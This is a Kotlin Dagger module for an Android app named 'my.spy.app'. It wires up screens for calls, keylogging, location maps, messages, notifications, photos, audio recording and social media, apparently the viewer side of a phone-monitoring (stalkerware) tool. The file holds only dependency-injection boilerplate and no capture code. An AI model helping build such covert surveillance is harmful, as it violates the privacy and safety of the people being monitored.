@file:Suppress("unused")

package com.my.spy.app.di.module

import android.content.Context
import androidx.fragment.app.FragmentManager
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import com.my.spy.app.di.PerActivity
import com.my.spy.app.ui.activities.login.InteractorLogin
import com.my.spy.app.ui.activities.login.InterfaceInteractorLogin
import com.my.spy.app.ui.activities.login.InterfaceViewLogin
import com.my.spy.app.ui.activities.mainparent.InteractorMainParent
import com.my.spy.app.ui.activities.mainparent.InterfaceInteractorMainParent
import com.my.spy.app.ui.activities.mainparent.InterfaceViewMainParent
import com.my.spy.app.ui.activities.register.InteractorRegister
import com.my.spy.app.ui.activities.register.InterfaceInteractorRegister
import com.my.spy.app.ui.activities.register.InterfaceViewRegister
import com.my.spy.app.ui.fragments.calls.InteractorCalls
import com.my.spy.app.ui.fragments.calls.InterfaceInteractorCalls
import com.my.spy.app.ui.fragments.calls.InterfaceViewCalls
import com.my.spy.app.ui.fragments.photo.InteractorPhoto
import com.my.spy.app.ui.fragments.photo.InterfaceInteractorPhoto
import com.my.spy.app.ui.fragments.photo.InterfaceViewPhoto
import com.my.spy.app.ui.fragments.keylog.InteractorKeys
import com.my.spy.app.ui.fragments.keylog.InterfaceInteractorKeys
import com.my.spy.app.ui.fragments.keylog.InterfaceViewKeys
import com.my.spy.app.ui.fragments.maps.InteractorMaps
import com.my.spy.app.ui.fragments.maps.InterfaceInteractorMaps
import com.my.spy.app.ui.fragments.maps.InterfaceViewMaps
import com.my.spy.app.ui.fragments.message.InteractorMessage
import com.my.spy.app.ui.fragments.message.InterfaceInteractorMessage
import com.my.spy.app.ui.fragments.message.InterfaceViewMessage
import com.my.spy.app.ui.fragments.notifications.InteractorNotifyMessage
import com.my.spy.app.ui.fragments.notifications.InterfaceInteractorNotifyMessage
import com.my.spy.app.ui.fragments.notifications.InterfaceViewNotifyMessage
import com.my.spy.app.ui.fragments.recording.InteractorRecording
import com.my.spy.app.ui.fragments.recording.InterfaceInteractorRecording
import com.my.spy.app.ui.fragments.recording.InterfaceViewRecording
import com.my.spy.app.ui.fragments.social.InteractorSocial
import com.my.spy.app.ui.fragments.social.InterfaceInteractorSocial
import com.my.spy.app.ui.fragments.social.InterfaceViewSocial
import com.google.android.gms.maps.SupportMapFragment
import dagger.Module
import dagger.Provides


@Module
class ActivityModule(private val activity: AppCompatActivity) {

    @Provides
    fun provideContext(): Context = activity.applicationContext

    @Provides
    fun provideActivity(): AppCompatActivity = activity

    @Provides
    fun provideSupportFragmentManager(): FragmentManager = activity.supportFragmentManager

    @Provides
    fun provideSupportMapFragment(): SupportMapFragment = SupportMapFragment.newInstance()

    @Provides
    fun provideLayoutManager(context: Context): LinearLayoutManager = LinearLayoutManager(context)

    @Provides
    @PerActivity
    fun provideInterfaceInteractorMain(interactorParent: InteractorMainParent<InterfaceViewMainParent>): InterfaceInteractorMainParent<InterfaceViewMainParent> = interactorParent

    @Provides
    @PerActivity
    fun provideInterfaceInteractorLogin(interactor: InteractorLogin<InterfaceViewLogin>): InterfaceInteractorLogin<InterfaceViewLogin> = interactor

    @Provides
    @PerActivity
    fun provideInterfaceInteractorRegister(interactor: InteractorRegister<InterfaceViewRegister>): InterfaceInteractorRegister<InterfaceViewRegister> = interactor

    @Provides
    @PerActivity
    fun provideInterfaceInteractorMaps(interactor: InteractorMaps<InterfaceViewMaps>): InterfaceInteractorMaps<InterfaceViewMaps> = interactor

    @Provides
    @PerActivity
    fun provideInterfaceInteractorCalls(interactor: InteractorCalls<InterfaceViewCalls>): InterfaceInteractorCalls<InterfaceViewCalls> = interactor

    @Provides
    @PerActivity
    fun provideInterfaceInteractorKeys(interactor: InteractorKeys<InterfaceViewKeys>): InterfaceInteractorKeys<InterfaceViewKeys> = interactor

    @Provides
    @PerActivity
    fun provideInterfaceInteractorMessage(interactor: InteractorMessage<InterfaceViewMessage>): InterfaceInteractorMessage<InterfaceViewMessage> = interactor

    @Provides
    @PerActivity
    fun provideInterfaceInteractorPhoto(interactor: InteractorPhoto<InterfaceViewPhoto>): InterfaceInteractorPhoto<InterfaceViewPhoto> = interactor

    @Provides
    @PerActivity
    fun provideInterfaceInteractorSocial(interactor: InteractorSocial<InterfaceViewSocial>): InterfaceInteractorSocial<InterfaceViewSocial> = interactor

    @Provides
    @PerActivity
    fun provideInterfaceInteractorRecording(interactor: InteractorRecording<InterfaceViewRecording>): InterfaceInteractorRecording<InterfaceViewRecording> = interactor

    @Provides
    @PerActivity
    fun provideInterfaceInteractorNotify(interactor: InteractorNotifyMessage<InterfaceViewNotifyMessage>): InterfaceInteractorNotifyMessage<InterfaceViewNotifyMessage> = interactor


}